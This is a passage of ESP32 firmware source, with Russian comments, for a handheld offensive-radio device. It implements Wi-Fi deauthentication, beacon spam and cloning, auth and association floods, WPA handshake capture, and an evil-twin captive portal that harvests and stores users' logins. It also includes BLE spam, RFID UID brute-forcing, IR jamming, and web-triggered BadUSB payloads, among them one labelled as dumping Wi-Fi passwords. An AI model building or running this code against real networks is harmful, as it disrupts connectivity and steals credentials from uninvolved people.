  for (uint32_t uid32 = 0; uid32 < 0xFFFFFFFF; uid32 += 0x100) {
    cmd[4] = (uid32 >> 24) & 0xFF;
    cmd[5] = (uid32 >> 16) & 0xFF;
    cmd[6] = (uid32 >> 8) & 0xFF;
    cmd[7] = uid32 & 0xFF;
    canvas.fillRect(0, 75, 128, 25, COLOR_BLACK);
    canvas.setTextColor(COLOR_CYAN);
    canvas.setCursor(5, 80);
    canvas.printf("UID: %08X", uid32);
    canvasFlush();
    nfc.sendCommandCheckAck(cmd, sizeof(cmd), 100);
    delay(30);
    if (digitalRead(BTN_ESC) == LOW) {
      drawHeaderBar("BRUTEFORCE");
      canvas.setTextColor(COLOR_RED);
      canvas.setCursor(5, 50);
      canvas.print("Stopped");
      canvasFlush();
      delay(800);
      return;
    }
    updateBuzzer();
    yield();
  }
  drawHeaderBar("BRUTEFORCE");
  canvas.setTextColor(COLOR_RED);
  canvas.setCursor(5, 50);
  canvas.print("Finished");
  canvasFlush();
  delay(1500);
}

// ======================================================================
// 12. Wi-Fi ФУНКЦИИ
// ======================================================================
void executeWiFiScan() {
  drawHeaderBar("SCANNING WIFI...");
  canvas.setTextColor(COLOR_CYAN);
  canvas.setCursor(10, 50);
  canvas.print("Scanning airwaves...");
  canvasFlush();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  int16_t foundNets = WiFi.scanNetworks(false, false, false, 300);
  wifiScannedCount = 0;
  if (foundNets > 0) {
    if (foundNets > 12) foundNets = 12;
    wifiScannedCount = foundNets;
    for (int i = 0; i < foundNets; i++) {
      snprintf(scannedNetworks[i].ssid, sizeof(scannedNetworks[i].ssid), "%s", WiFi.SSID(i).c_str());
      scannedNetworks[i].rssi = WiFi.RSSI(i);
      scannedNetworks[i].channel = WiFi.channel(i);
      memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
      updateBuzzer();
    }
  }
  wifiSelectedIndex = 0;
  wifiScrollOffset = 0;
  drawWiFiScanPage();
}

void drawWiFiScanPage() {
  drawHeaderBar("WIFI SCANNER");
  if (wifiScannedCount == 0) {
    canvas.setTextColor(COLOR_YELLOW);
    canvas.setCursor(10, 45);
    canvas.print("No Nets Scanned.");
    canvas.setCursor(10, 60);
    canvas.setTextColor(COLOR_WHITE);
    canvas.print("Press DOWN to scan");
    drawFooterBar("DN:Scan  OK:Attack  ESC:Back");
    canvasFlush();
    return;
  }
  if (wifiSelectedIndex < wifiScrollOffset) wifiScrollOffset = wifiSelectedIndex;
  if (wifiSelectedIndex >= wifiScrollOffset + 4) wifiScrollOffset = wifiSelectedIndex - 3;
  for (int i = 0; i < 4; i++) {
    int netIdx = i + wifiScrollOffset;
    if (netIdx >= wifiScannedCount) break;
    int lineY = 25 + i * 20;
    if (netIdx == wifiSelectedIndex) {
      canvas.fillRoundRect(3, lineY - 3, 122, 17, 3, accentColor);
      canvas.setTextColor(COLOR_BLACK);
    } else {
      canvas.setTextColor(COLOR_WHITE);
    }
    canvas.setCursor(5, lineY);
    canvas.printf("%d.%s", netIdx + 1, scannedNetworks[netIdx].ssid);
    canvas.setCursor(100, lineY);
    canvas.print(scannedNetworks[netIdx].rssi);
  }
  drawFooterBar("DN:Scan  OK:Attack  ESC:Back");
  canvasFlush();
}

void drawAttackChoiceMenu() {
  String title = "ATTACK ON " + String(scannedNetworks[wifiSelectedIndex].ssid);
  drawGenericSubMenu(title.c_str(), attackChoiceList, ATTACK_CHOICE_COUNT, wifiAttackChoice, wifiAttackScroll);
}

// Базовые функции для отправки кадров
void wifi_random_mac(uint8_t *mac) {
  for (int i = 0; i < 6; i++) mac[i] = random(0x00, 0xFF); updateBuzzer();
  mac[0] = (mac[0] & 0xFE) | 0x02;
}

void wifi_send_deauth(uint8_t* bssid, uint8_t* dst, uint16_t reason) {
  if (dst == nullptr) dst = (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF";
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00,
    dst[0], dst[1], dst[2], dst[3], dst[4], dst[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00,
    reason & 0xFF, (reason >> 8) & 0xFF
  };
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, 26, false);
}

void wifi_send_beacon(uint8_t* src, uint8_t* dst, const char* ssid, bool withRSN) {
  if (dst == nullptr) dst = (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF";
  uint8_t beacon[128] = {
    0x80, 0x00, 0x00, 0x00,
    dst[0], dst[1], dst[2], dst[3], dst[4], dst[5],
    src[0], src[1], src[2], src[3], src[4], src[5],
    src[0], src[1], src[2], src[3], src[4], src[5],
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00, 0x11, 0x00
  };
  int len = 38;
  beacon[len++] = 0x00;
  int ssidLen = strlen(ssid);
  beacon[len++] = ssidLen;
  memcpy(beacon + len, ssid, ssidLen);
  len += ssidLen;
  if (withRSN) {
    uint8_t rsn[] = {0x30, 0x14, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, 0x00, 0x00};
    memcpy(beacon + len, rsn, sizeof(rsn));
    len += sizeof(rsn);
  }
  esp_wifi_80211_tx(WIFI_IF_AP, beacon, len, false);
}

void wifi_send_assoc(uint8_t* src, uint8_t* bssid, const char* ssid, uint16_t seq) {
  uint8_t assoc[64] = {
    0x00, 0x00, 0x00, 0x00,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    src[0], src[1], src[2], src[3], src[4], src[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00,
    0x01, 0x00, 0x0A, 0x00,
    0x00, (uint8_t)strlen(ssid)
  };
  int len = 28;
  memcpy(assoc + len, ssid, strlen(ssid));
  len += strlen(ssid);
  assoc[len++] = 0x01;
  assoc[len++] = 0x01;
  assoc[len++] = 0x8C;
  esp_wifi_80211_tx(WIFI_IF_STA, assoc, len, false);
}

void wifi_send_auth(uint8_t* src, uint8_t* bssid, uint16_t seq) {
  uint8_t auth[30] = {
    0xB0, 0x00, 0x3A, 0x01,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    src[0], src[1], src[2], src[3], src[4], src[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00,
    0x00, 0x00, 0x01, 0x00, 0x00, 0x00
  };
  esp_wifi_80211_tx(WIFI_IF_STA, auth, 30, false);
}

// Атаки
void runDeauthAttack(bool all) {
  if (wifiScannedCount == 0) { showPopup("Scan networks first"); return; }
  std::vector<int> targets;
  if (all) {
    for (int i = 0; i < wifiScannedCount; i++) targets.push_back(i);
  } else {
    if (wifiSelectedIndex < 0 || wifiSelectedIndex >= wifiScannedCount) return;
    targets.push_back(wifiSelectedIndex);
  }
  drawHeaderBar("DEAUTH ATTACK");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 25);
  canvas.printf("Targets: %d", targets.size());
  canvas.setCursor(5, 45);
  canvas.print("Press ESC to stop");
  canvasFlush();

  unsigned long attackStart = millis();
  bool stop = false;
  while (!stop) {
    for (int idx : targets) {
      if (digitalRead(BTN_ESC) == LOW) { stop = true; break; }
      int ch = scannedNetworks[idx].channel;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      for (int f = 0; f < framesPerDeauth; f++) {
        wifi_send_deauth(scannedNetworks[idx].bssid, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
        delay(sendDelay);
        yield();
        esp_task_wdt_reset();
        if (digitalRead(BTN_ESC) == LOW) { stop = true; break; }
      }
    }
    updateBuzzer();
    if (millis() - attackStart > 60000) stop = true; // таймаут 60 сек
  }
  showPopup("Deauth stopped");
}

void runBeaconAttack(bool clone) {
  if (wifiScannedCount == 0) { showPopup("Scan networks first"); return; }
  if (clone && (wifiSelectedIndex < 0 || wifiSelectedIndex >= wifiScannedCount)) { showPopup("Select target first"); return; }
  drawHeaderBar(clone ? "BEACON CLONE" : "BEACON SPAM");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 25);
  canvas.print("Press ESC to stop");
  canvasFlush();
  uint8_t src[6];
  unsigned long nextSend = millis();
  while (digitalRead(BTN_ESC) == HIGH) {
    if (millis() - nextSend >= 50) { // частота 20 Гц
      nextSend = millis();
      wifi_random_mac(src);
      if (clone) {
        String ssid = String(scannedNetworks[wifiSelectedIndex].ssid);
        for (int i = 0; i < maxClone; i++) ssid += " ";
        esp_wifi_set_channel(scannedNetworks[wifiSelectedIndex].channel, WIFI_SECOND_CHAN_NONE);
        for (int f = 0; f < framesPerBeacon; f++)
          wifi_send_beacon(src, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid.c_str(), true);
      } else {
        String ssid = generateRandomString(10);
        for (int i = 0; i < maxSpamSpace; i++) ssid += " ";
        esp_wifi_set_channel(random(1, 12), WIFI_SECOND_CHAN_NONE);
        for (int f = 0; f < framesPerBeacon; f++)
          wifi_send_beacon(src, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid.c_str(), false);
      }
      yield();
      esp_task_wdt_reset();
    }
    updateBuzzer();
    yield();
  }
  showPopup("Beacon stopped");
}

void runAssocAuthAttack(bool auth) {
  if (wifiSelectedIndex < 0 || wifiSelectedIndex >= wifiScannedCount) { showPopup("Select target first"); return; }
  uint8_t* bssid = scannedNetworks[wifiSelectedIndex].bssid;
  int ch = scannedNetworks[wifiSelectedIndex].channel;
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint16_t seq = 0;
  drawHeaderBar(auth ? "AUTH FLOOD" : "ASSOC FLOOD");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 25);
  canvas.print("Press ESC to stop");
  canvasFlush();
  unsigned long nextSend = millis();
  while (digitalRead(BTN_ESC) == HIGH) {
    if (millis() - nextSend >= 10) {
      nextSend = millis();
      uint8_t src[6]; wifi_random_mac(src);
      if (auth)
        wifi_send_auth(src, bssid, seq++);
      else
        wifi_send_assoc(src, bssid, scannedNetworks[wifiSelectedIndex].ssid, seq++);
      yield();
      esp_task_wdt_reset();
    }
    updateBuzzer();
    yield();
  }
  showPopup("Attack stopped");
}

void runEvilTwin() {
  if (wifiSelectedIndex < 0 || wifiSelectedIndex >= wifiScannedCount) { showPopup("Select target first"); return; }
  String targetSSID = scannedNetworks[wifiSelectedIndex].ssid;
  strncpy(evilPortalSsid, targetSSID.c_str(), sizeof(evilPortalSsid) - 1);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(evilPortalSsid);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  webServer.on("/login", HTTP_POST, []() {
    String u = webServer.hasArg("user") ? webServer.arg("user") : "unknown";
    String p = webServer.hasArg("pass") ? webServer.arg("pass") : "empty";
    appendCredToSd(u, p);
    lastCapturedCred = u + " / " + p;
    capturedCredsCount++;
    webServer.send(200, "text/html", "<html><body><h2>Success</h2></body></html>");
  });
  webServer.onNotFound([]() { webServer.send(200, "text/html", EVIL_PORTAL_HTML); });
  webServer.begin();
  uint8_t* bssid = scannedNetworks[wifiSelectedIndex].bssid;
  int ch = scannedNetworks[wifiSelectedIndex].channel;
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  drawHeaderBar("EVIL TWIN ACTIVE");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 25);
  canvas.printf("SSID: %s", evilPortalSsid);
  canvas.setCursor(5, 45);
  canvas.print("Press ESC to stop");
  canvasFlush();
  while (digitalRead(BTN_ESC) == HIGH) {
    wifi_send_deauth(bssid, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
    dnsServer.processNextRequest();
    webServer.handleClient();
    delay(50);
    yield();
    esp_task_wdt_reset();
  }
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  showPopup("Evil Twin stopped");
}

void runSourApple() {
  drawHeaderBar("SOUR APPLE BLE");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 25);
  canvas.print("BLE Spam Active!");
  canvas.setCursor(5, 45);
  canvas.print("Press ESC to stop");
  canvasFlush();

  // 1. Полностью отключаем Wi-Fi, чтобы освободить радио
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(100);

  // 2. Инициализируем BLE с именем "AirPods Pro" (или любым другим)
  BLEDevice::init("AirPods Pro");
  BLEServer *pServer = BLEDevice::createServer();
  BLEAdvertising *pAdvertising = pServer->getAdvertising();

  // 3. Создаем массив с рекламными данными (включает имя устройства)
  // Эти данные имитируют реальный пакет AirPods
  uint8_t packetData[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x13, 0x04, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00
  };

  BLEAdvertisementData advData;
  advData.addData(String((char*)packetData, sizeof(packetData)));

  // 4. Настраиваем рекламу на постоянную отправку
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();

  // 5. Цикл атаки (пока не нажата ESC)
  unsigned long lastMacChange = millis();
  uint8_t counter = 0;
  
  while (digitalRead(BTN_ESC) == HIGH) {
    // Меняем MAC-адрес каждые 300 мс, чтобы создавать иллюзию "новых" устройств
    if (millis() - lastMacChange > 300) {
      lastMacChange = millis();
      counter++;
      // Генерируем случайный MAC для видимости нового устройства
      uint8_t randomMac[6];
      for (int i = 0; i < 6; i++) randomMac[i] = random(0, 255); updateBuzzer();
      randomMac[0] = (randomMac[0] & 0xFE) | 0x02; // Устанавливаем локально администрируемый бит
      
      pAdvertising->setScanResponseData(advData);
      pAdvertising->stop();
      pAdvertising->start();
      
      // Меняем имя (например, чередуем AirPods, AirPods Pro, AirPods Max)
      String deviceName = "AirPods";
      if (counter % 3 == 1) deviceName = "AirPods Pro";
      else if (counter % 3 == 2) deviceName = "AirPods Max";
      pServer->getAdvertising()->setScanResponseData(advData);
    }
    
    // Не даем сторожевому таймеру убить прошивку
    updateBuzzer();
    esp_task_wdt_reset();
    yield();
    delay(10);
  }

  // 6. Останавливаем BLE после завершения атаки
  BLEDevice::deinit(true);
  
  // 7. Восстанавливаем Wi-Fi (если нужно)
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  showPopup("Sour Apple BLE stopped");
}

void drawWiFiSettingsPage() {
  drawHeaderBar("WIFI ATTACK SETTINGS");
  const char* labels[] = {"Frames/Deauth", "Deauth Delay", "Frames/Beacon", "Max Clone", "Max Spaces"};
  int values[] = {framesPerDeauth, sendDelay, framesPerBeacon, maxClone, maxSpamSpace};
  const int count = 5;
  for (int i = 0; i < count; i++) {
    int y = 25 + i * 18;
    canvas.setTextColor(COLOR_WHITE);
    canvas.setCursor(5, y);
    canvas.print(labels[i]);
    canvas.setCursor(100, y);
    if (wifiSettingsSelected == i && wifiEditValue) {
      canvas.setTextColor(accentColor);
      canvas.print(values[i]);
      canvas.drawFastHLine(100, y + 9, 20, accentColor);
    } else {
      canvas.print(values[i]);
    }
    if (wifiSettingsSelected == i && !wifiEditValue) {
      canvas.drawRect(2, y - 2, 124, 15, accentColor);
    }
    updateBuzzer();
  }
  drawFooterBar("UP/DN:Nav OK:Edit ESC:Back");
  canvasFlush();
}

void tickBeaconSpamTask() {
  if (!isBeaconSpamActive) return;
  static unsigned long lastSend = 0;
  if (millis() - lastSend < 50) return;
  lastSend = millis();
  char ssid[21];
  int len = random(6, 20);
  const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (int i = 0; i < len; i++) ssid[i] = chars[random(0, sizeof(chars)-1)];
  ssid[len] = '\0';
  uint8_t src[6];
  wifi_random_mac(src);
  wifi_send_beacon(src, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid, false);
}

void runDeauthTick() {
  if (deauthActive) {
    static unsigned long lastSend = 0;
    if (millis() - lastSend < 20) return;
    lastSend = millis();
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(scannedNetworks[wifiSelectedIndex].channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < 4; i++) {
      wifi_send_deauth(scannedNetworks[wifiSelectedIndex].bssid, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
      updateBuzzer();
    }
  } else {
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
  }
}

// ======================================================================
// 13. ЗАХВАТ HANDSHAKE
// ======================================================================
void captureHandshake(int targetIdx) {
  if (targetIdx < 0 || targetIdx >= wifiScannedCount) {
    showPopup("Invalid target");
    return;
  }
  memcpy(handshakeBSSID, scannedNetworks[targetIdx].bssid, 6);
  int channel = scannedNetworks[targetIdx].channel;
  
  drawHeaderBar("HANDSHAKE CAPTURE");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 25);
  canvas.printf("Target: %s", scannedNetworks[targetIdx].ssid);
  canvas.setCursor(5, 40);
  canvas.print("Listening on channel ");
  canvas.print(channel);
  canvas.setCursor(5, 55);
  canvas.print("Press ESC to abort");
  canvasFlush();
  
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(promiscuousRxCallback);
  
  handshakeCapturing = true;
  handshakeDone = false;
  handshakeEAPOLCount = 0;
  handshakeFrameCount = 0;
  handshakeStartTime = millis();
  
  unsigned long lastUpdate = millis();
  while (!handshakeDone && digitalRead(BTN_ESC) == HIGH) {
    if (millis() - lastUpdate > 1000) {
      lastUpdate = millis();
      canvas.fillRect(0, 70, 128, 20, COLOR_BLACK);
      canvas.setTextColor(COLOR_CYAN);
      canvas.setCursor(5, 72);
      canvas.printf("EAPOL: %d frames", handshakeEAPOLCount);
      canvasFlush();
    }
    if (millis() - handshakeStartTime > 5000 && handshakeEAPOLCount == 0) {
      wifi_send_deauth(handshakeBSSID, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
      delay(10);
    }
    updateBuzzer();
    yield();
    esp_task_wdt_reset();
  }
  
  esp_wifi_set_promiscuous(false);
  handshakeCapturing = false;
  
  if (handshakeDone) {
    saveHandshakeToSD();
    showPopup("Handshake captured! Saved to /handshake.pcap");
  } else {
    showPopup("Handshake capture aborted");
  }
  WiFi.mode(WIFI_OFF);
  drawWiFiScanPage();
}

void promiscuousRxCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (!handshakeCapturing) return;
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t *payload = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  
  if (len < 24) return;
  uint8_t fc = payload[0] & 0x0C;
  if (fc != 0x08) return;
  uint8_t* addr1 = &payload[4];
  uint8_t* addr2 = &payload[10];
  bool toBSSID = (memcmp(addr1, handshakeBSSID, 6) == 0);
  bool fromBSSID = (memcmp(addr2, handshakeBSSID, 6) == 0);
  if (!toBSSID && !fromBSSID) return;
  
  if (len < 24 + 8) return;
  if (payload[24] != 0x88 || payload[25] != 0x8E) return;
  
  int copyLen = (len - 24 < 256) ? len - 24 : 256;
  memcpy(handshakeEAPOL[handshakeEAPOLCount % 4], payload + 24, copyLen);
  handshakeEAPOLCount++;
  if (handshakeEAPOLCount >= 4) {
    handshakeDone = true;
    handshakeCapturing = false;
  }
}

void saveHandshakeToSD() {
  if (!isSdCardAvailable) return;
  digitalWrite(TFT_CS, HIGH);
  digitalWrite(SD_CS, LOW);
  File pcap = SD.open("/handshake.pcap", FILE_WRITE);
  if (!pcap) {
    digitalWrite(SD_CS, HIGH);
    return;
  }
  uint32_t magic = 0xA1B2C3D4;
  uint16_t version_major = 2;
  uint16_t version_minor = 4;
  int32_t timezone = 0;
  uint32_t sigfigs = 0;
  uint32_t snaplen = 65535;
  uint32_t network = 105;
  pcap.write((uint8_t*)&magic, 4);
  pcap.write((uint8_t*)&version_major, 2);
  pcap.write((uint8_t*)&version_minor, 2);
  pcap.write((uint8_t*)&timezone, 4);
  pcap.write((uint8_t*)&sigfigs, 4);
  pcap.write((uint8_t*)&snaplen, 4);
  pcap.write((uint8_t*)&network, 4);
  
  for (int i = 0; i < handshakeEAPOLCount && i < 4; i++) {
    uint32_t ts_sec = (uint32_t)(millis() / 1000);
    uint32_t ts_usec = (uint32_t)((millis() % 1000) * 1000);
    uint32_t incl_len = 256;
    uint32_t orig_len = incl_len;
    pcap.write((uint8_t*)&ts_sec, 4);
    pcap.write((uint8_t*)&ts_usec, 4);
    pcap.write((uint8_t*)&incl_len, 4);
    pcap.write((uint8_t*)&orig_len, 4);
    pcap.write(handshakeEAPOL[i], incl_len);
    updateBuzzer();
  }
  pcap.close();
  digitalWrite(SD_CS, HIGH);
}
void capturedpasswords() {
  drawHeaderBar("EVIL PORTAL PASSWORDS");
  if (capturedCredCount == 0) {
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 45);
    canvas.print("No credentials saved");
    drawFooterBar("ESC: Back");
    canvasFlush();
    return;
  }
  if (capturedSelectedIndex < 0) capturedSelectedIndex = 0;
  if (capturedSelectedIndex >= capturedCredCount) capturedSelectedIndex = capturedCredCount - 1;
  if (capturedSelectedIndex < capturedScrollOffset) capturedScrollOffset = capturedSelectedIndex;
  if (capturedSelectedIndex >= capturedScrollOffset + MAX_VISIBLE_ITEMS) {
    capturedScrollOffset = capturedSelectedIndex - MAX_VISIBLE_ITEMS + 1;
  }
  if (capturedScrollOffset < 0) capturedScrollOffset = 0;
  if (capturedScrollOffset > capturedCredCount - MAX_VISIBLE_ITEMS) {
    capturedScrollOffset = capturedCredCount - MAX_VISIBLE_ITEMS;
  }
  if (millis() - marqueeTimer > 200) {
    marqueeTimer = millis();
    marqueeOffset++;
  }
  for (uint8_t i = 0; i < MAX_VISIBLE_ITEMS; i++) {
    int idx = i + capturedScrollOffset;
    if (idx >= capturedCredCount) break;
    int lineY = 25 + i * 20;
    String fullLine = capturedCredLines[idx];
    if (idx == capturedSelectedIndex) {
      canvas.fillRoundRect(2, lineY - 3, 124, 17, 3, accentColor);
      canvas.setTextColor(COLOR_BLACK);
      canvas.setCursor(4, lineY);
      canvas.print("> ");
      if (fullLine.length() * 6 > 100) {
        int shift = marqueeOffset % (fullLine.length() + 3);
        String subText = fullLine.substring(shift) + "   " + fullLine.substring(0, shift);
        canvas.print(subText.substring(0, 16));
      } else {
        canvas.print(fullLine);
      }
    } else {
      canvas.setTextColor(COLOR_WHITE);
      canvas.setCursor(4, lineY);
      canvas.print("  ");
      String displayLine = fullLine;
      if (displayLine.length() > 18) displayLine = displayLine.substring(0, 18) + "...";
      canvas.print(displayLine);
    }
    updateBuzzer();
  }
  if (capturedCredCount > MAX_VISIBLE_ITEMS) {
    int barHeight = 85 / capturedCredCount;
    int barY = 25 + (capturedScrollOffset * 85) / capturedCredCount;
    canvas.drawFastVLine(126, 25, 85, COLOR_DARKGREY);
    canvas.fillRect(125, barY, 3, barHeight < 5 ? 5 : barHeight, accentColor);
  }
  drawFooterBar("UP/DN:Scroll  OK:Copy?");
  canvasFlush();
}

// ======================================================================
// 18. ВЕБ-СЕРВЕР (УПРАВЛЕНИЕ МЫШЬЮ, БЕЗ ЯРКОСТИ)
// ======================================================================
void setupWebServerRoutes() {
  webServer.on("/", HTTP_GET, []() {
    webServer.send(200, "text/html", HTML_DASHBOARD);
  });

  webServer.on("/api/hid/notepad", HTTP_GET, []() {
    runBadUsbDemoNotepad();
    webServer.send(200, "application/json", "{\"msg\":\"Win+R Notepad выполнен!\"}");
  });
  webServer.on("/api/hid/payload", HTTP_GET, []() {
    executeDuckyScriptFromSd();
    webServer.send(200, "application/json", "{\"msg\":\"Скрипт /payload.txt выполнен!\"}");
  });
  webServer.on("/api/hid/type", HTTP_GET, []() {
    if (webServer.hasArg("text")) {
      String t = webServer.arg("text");
      runBadUsbCustomString(t);
      webServer.send(200, "application/json", "{\"msg\":\"Текст напечатан!\"}");
    } else {
      webServer.send(200, "application/json", "{\"msg\":\"Ошибка: Нет текста\"}");
    }
  });

  webServer.on("/api/badusb/shutdown", HTTP_GET, []() {
    runBadUsbShutdown();
    webServer.send(200, "application/json", "{\"msg\":\"Shutdown executed\"}");
  });
  webServer.on("/api/badusb/wallpaper", HTTP_GET, []() {
    runBadUsbWallpaper();
    webServer.send(200, "application/json", "{\"msg\":\"Wallpaper changed\"}");
  });
  webServer.on("/api/badusb/disableicons", HTTP_GET, []() {
    runBadUsbDisableIcons();
    webServer.send(200, "application/json", "{\"msg\":\"Icons disabled\"}");
  });
  webServer.on("/api/badusb/dumpwifi", HTTP_GET, []() {
    runBadUsbDumpWifi();
    webServer.send(200, "application/json", "{\"msg\":\"Wi-Fi passwords dumped\"}");
  });

  webServer.on("/api/portal/start", HTTP_GET, []() {
    webServer.send(200, "application/json", "{\"msg\":\"Evil Portal запущен на дисплее!\"}");
    startEvilPortalService();
  });
  webServer.on("/api/portal/stop", HTTP_GET, []() {
    isEvilPortalRunning = false;
    webServer.send(200, "application/json", "{\"msg\":\"Evil Portal остановлен\"}");
  });
  webServer.on("/api/portal/creds", HTTP_GET, []() {
    String json = "{\"count\":" + String(capturedCredsCount) + ",\"last\":\"" + lastCapturedCred + "\"}";
    webServer.send(200, "application/json", json);
  });
  webServer.on("/api/portal/creds/list", HTTP_GET, []() {
    String json = "[";
    if (isSdCardAvailable) {
      digitalWrite(TFT_CS, HIGH);
      digitalWrite(SD_CS, LOW);
      File logFile = SD.open("/captured_creds.txt", FILE_READ);
      if (logFile) {
        bool first = true;
        while (logFile.available()) {
          String line = logFile.readStringUntil('\n');
          line.trim();
          if (line.length() > 0) {
            if (!first) json += ",";
            first = false;
            json += "\"" + line + "\"";
          }
        }
        logFile.close();
      }
      digitalWrite(SD_CS, HIGH);
    }
    json += "]";
    webServer.send(200, "application/json", json);
  });

  webServer.on("/api/rfid/scan", HTTP_GET, []() {
    executeRfidTagScan();
    String json = "{\"msg\":\"Метка прочитана!\", \"uid\":\"" + String(activeRfidUidHex) + "\"}";
    webServer.send(200, "application/json", json);
  });
  webServer.on("/api/rfid/emulate", HTTP_GET, []() {
    webServer.send(200, "application/json", "{\"msg\":\"Эмуляция запущенa! Нажмите ESC на плате для выхода.\"}");
    emulateActiveRfidUid();
  });
  webServer.on("/api/rfid/erase", HTTP_GET, []() {
    eraseDataOnCustomBlock();
    webServer.send(200, "application/json", "{\"msg\":\"Блок очищен (0x00)\"}");
  });
  webServer.on("/api/rfid/bruteforce/start", HTTP_GET, []() {
    bruteForceRfid();
    webServer.send(200, "application/json", "{\"msg\":\"Bruteforce started\"}");
  });

  webServer.on("/api/ir/tvbgone", HTTP_GET, []() {
    webServer.send(200, "application/json", "{\"msg\":\"Запущена пачка TV-B-Gone (100 кодов)!\"}");
    runClassicTvBGoneLoop();
  });
  webServer.on("/api/ir/get", HTTP_GET, []() {
    String irData = activeIrSignal.valid ?
      ("Proto: " + typeToString(activeIrSignal.type) + " | Val: 0x" + String((uint32_t)activeIrSignal.value, HEX)) :
      "IR RAM: Empty";
    String json = "{\"msg\":\"Данные получены\", \"ir\":\"" + irData + "\"}";
    webServer.send(200, "application/json", json);
  });
  webServer.on("/api/ir/jammer/start", HTTP_GET, []() {
    runIrJammer();
    webServer.send(200, "application/json", "{\"msg\":\"IR Jammer started\"}");
  });
  webServer.on("/api/ir/jammer/stop", HTTP_GET, []() {
    irJammerActive = false;
    webServer.send(200, "application/json", "{\"msg\":\"IR Jammer stopped\"}");
  });
  webServer.on("/api/ir/saved/list", HTTP_GET, []() {
    String json = "[";
    if (isSdCardAvailable) {
      digitalWrite(TFT_CS, HIGH);
      digitalWrite(SD_CS, LOW);
      File file = SD.open("/ir_saved.txt", FILE_READ);
      if (file) {
        bool first = true;
        while (file.available()) {
          String line = file.readStringUntil('\n');
          line.trim();
          if (line.length() > 0) {
            if (!first) json += ",";
            first = false;
            json += "\"" + line + "\"";
          }
        }
        file.close();
      }
      digitalWrite(SD_CS, HIGH);
    }
    json += "]";
    webServer.send(200, "application/json", json);
  });
  webServer.on("/api/ir/saved/send", HTTP_GET, []() {
    if (webServer.hasArg("index")) {
      int idx = webServer.arg("index").toInt();
      sendIrSavedSignal(idx);
      webServer.send(200, "application/json", "{\"msg\":\"Signal sent\"}");
    } else {
      webServer.send(200, "application/json", "{\"msg\":\"Missing index\"}");
    }
  });

  webServer.on("/api/wifi/scan", HTTP_GET, []() {
    WiFi.mode(WIFI_AP_STA);
    int16_t n = WiFi.scanNetworks(false, false, false, 200);
    String json = "[";
    for (int i = 0; i < n; i++) {
      if (i > 0) json += ",";
      json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",\"rssi\":" + String(WiFi.RSSI(i)) + ",\"ch\":" + String(WiFi.channel(i)) + "}";
      if (i >= 10) break;
    }
    json += "]";
    WiFi.scanDelete();
    webServer.send(200, "application/json", json);
  });
  webServer.on("/api/wifi/wardrive", HTTP_GET, []() {
    executeSdWardrivingLog();
    webServer.send(200, "application/json", "{\"msg\":\"Wardrive сохранён в /wardrive.csv!\"}");
  });
  webServer.on("/api/wifi/beacon/start", HTTP_GET, []() {
